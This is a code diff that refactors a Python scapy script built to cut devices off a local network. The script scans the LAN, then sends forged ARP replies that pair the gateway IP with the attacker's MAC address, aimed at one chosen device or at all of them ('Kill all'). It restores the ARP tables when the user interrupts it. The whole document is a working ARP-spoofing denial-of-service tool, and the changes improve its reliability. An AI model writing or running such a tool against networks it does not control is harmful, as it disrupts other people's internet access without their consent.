@@ -17,58 +17,56 @@ from scapy.all import arping, ARP, send, conf, get_if_hwaddr
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 conf.verb = 0
 
-def get_ip_macs(ips):
-    """
-    Returns a list of tuples (ip, mac) of all computers on the network.
-    """
-    answers, _ = arping(ips, verbose=0)
-    res = []
-    for sent, received in answers:
-        res.append((received.psrc, received.hwsrc))
-    return res
+
+def get_ip_macs(ips, iface):
+    """Return a list of ``(ip, mac)`` tuples for devices on the network."""
+    answers, _ = arping(ips, iface=iface, verbose=0)
+    return [(r.psrc, r.hwsrc) for _, r in answers]
+
 
 def poison(victim_ip, victim_mac, gateway_ip, src_mac):
-    """
-    Send the victim an ARP packet pairing the gateway IP with a wrong MAC
-    (src_mac), effectively cutting its route to the router.
-    """
-    pkt = ARP(op=2,
-              psrc=gateway_ip,
-              hwsrc=src_mac,
-              pdst=victim_ip,
-              hwdst=victim_mac)
+    """Send ARP packet associating ``gateway_ip`` with ``src_mac``."""
+    pkt = ARP(
+        op=2,
+        psrc=gateway_ip,
+        hwsrc=src_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac,
+    )
     send(pkt, verbose=0)
+
 
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
-    """
-    Send the victim an ARP packet pairing the gateway IP with the correct MAC,
-    restoring normal connectivity.
-    """
-    pkt = ARP(op=2,
-              psrc=gateway_ip,
-              hwsrc=gateway_mac,
-              pdst=victim_ip,
-              hwdst=victim_mac)
+    """Send ARP packet pairing ``gateway_ip`` with ``gateway_mac``."""
+    pkt = ARP(
+        op=2,
+        psrc=gateway_ip,
+        hwsrc=gateway_mac,
+        pdst=victim_ip,
+        hwdst=victim_mac,
+    )
     send(pkt, verbose=0)
 
+
 def get_lan_ip():
-    """
-    Obtains the current LAN IP address by opening a UDP socket to the internet.
-    """
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    ip = s.getsockname()[0]
-    s.close()
-    return ip
+    """Return the LAN IP by opening a UDP socket to a public address."""
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.connect(("8.8.8.8", 80))
+        return sock.getsockname()[0]
+
 
 def print_divider():
     print('-' * 40)
 
-def main():
-    # must be root
+
+def check_root():
+    """Exit the script if not running as root."""
     if os.geteuid() != 0:
-        print("You need to run the script as root/sudo.")
-        return
+        raise SystemExit("You need to run the script as root/sudo.")
+
+
+def main():
+    check_root()
 
     # determine your interface MAC to use as spoof source
     iface = conf.iface
@@ -85,7 +83,7 @@ def main():
         ip_range = '.'.join(octets[:3] + ['0/24'])
 
         # discover devices
-        devices = get_ip_macs(ip_range)
+        devices = get_ip_macs(ip_range, iface)
 
         print_divider()
         print("Connected devices:")
@@ -106,13 +104,11 @@ def main():
         print("(r) Refresh, (a) Kill all, (q) Quit")
 
         choice = None
-        kill_all = False
         while True:
             cmd = input("> ").strip().lower()
             if cmd == 'r':
                 break
             if cmd == 'a':
-                kill_all = True
                 choice = 'a'
                 refreshing = False
                 break
@@ -131,12 +127,17 @@ def main():
             while True:
                 for ip, mac in devices:
                     poison(ip, mac, gateway_ip, src_mac)
+                time.sleep(2)
 
         else:
             victim_ip, victim_mac = devices[choice]
-            print(f"Preventing {victim_ip} from accessing the internet... (Ctrl+C to stop)")
+            print(
+                f"Preventing {victim_ip} from accessing the internet... "
+                "(Ctrl+C to stop)"
+            )
             while True:
                 poison(victim_ip, victim_mac, gateway_ip, src_mac)
+                time.sleep(2)
 
     except KeyboardInterrupt:
         print("\nRestoring ARP tables...")
@@ -148,6 +149,7 @@ def main():
             if gateway_mac:
                 restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
         print("Done. You're welcome!")
+
 
 if __name__ == "__main__":
     main()
